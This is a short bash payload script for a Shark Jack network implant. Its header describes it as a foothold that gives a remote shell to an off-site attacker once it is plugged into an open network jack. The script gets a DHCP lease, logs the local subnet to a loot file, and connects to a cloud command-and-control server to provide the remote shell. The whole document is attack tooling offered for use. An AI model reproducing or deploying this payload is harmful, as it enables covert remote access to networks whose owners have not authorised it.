#!/bin/bash
#
# Title:         Foothold Payload for Shark Jack w/ C2
# Author:        wolfewa
# Version:       0.1
#
# This is set up to be placed in a open jack and give a remote shell 
# to an attacker that is not in the target site.
#
# LED SETUP ... Obtaining IP address from DHCP
# LED ATTACK ... connecting to C2 for shell 
# LED 
# LED FINISH ... Pull unit 
#

C2PROVISION="/etc/device.config"
LOOT_DIR=/root/loot
LOG="$LOOT_DIR/log.txt"


# Setup loot directory, DHCP client, and determine subnet
LED SETUP                            
mkdir -p $LOOT_DIR                           

NETMODE DHCP_CLIENT                          
while [ -z "$SUBNET" ]; do  
  sleep 1 && SUBNET=$(ip addr | grep -i eth0 | grep -i inet | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}[\/]{1}[0-9]{1,2}" | sed 's/\.[0-9]*\//\.0\//')
done
echo -e "#\n#\n# On subnet: $SUBNET \n#\n#"  >> $LOG

# Connect to Cloud C2
if [[ -f "$C2PROVISION" ]]; then
  LED SPECIAL
  # Connect to Cloud C2
  C2CONNECT
  # Wait until Cloud C2 connection is established
  while ! pgrep cc-client; do sleep 1; done

  
else
  # Exit script if not provisioned for C2
  LED R SOLID
  exit 1
fi



LED FINISH           